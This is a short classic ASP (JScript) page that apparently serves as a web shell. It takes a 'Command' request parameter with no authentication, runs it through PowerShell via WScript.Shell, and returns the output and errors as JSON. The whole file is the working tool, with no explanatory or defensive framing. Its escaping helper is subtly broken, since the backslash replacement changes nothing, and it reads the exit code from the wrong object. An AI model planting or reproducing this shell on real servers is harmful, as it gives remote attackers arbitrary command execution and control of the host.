<%@ Language=JScript %>
<%
Response.ContentType = 'application/json'

var sh = new ActiveXObject("WScript.Shell")
var posh = sh.Exec('cmd /c powershell -Command -')
var i=posh.StdIn;
i.WriteLine(Request('Command'))
i.Close()
var o = posh.StdOut.ReadAll()
var e = posh.StdErr.ReadAll()

function jsQuote(s) {
  return '"' + String(s)
    .replace(/\\/g, '\\')
    .replace(/\n/g, "\\n")
    .replace(/\r/g, "\\r")
    .replace(/"/g, '\\\"')
    + '"' 
}
%>
{
  "out": <%= jsQuote(o) %>,
  "err": <%= jsQuote(e) %>,
  "code": <%= i.ExitCode || 'null' %>
}
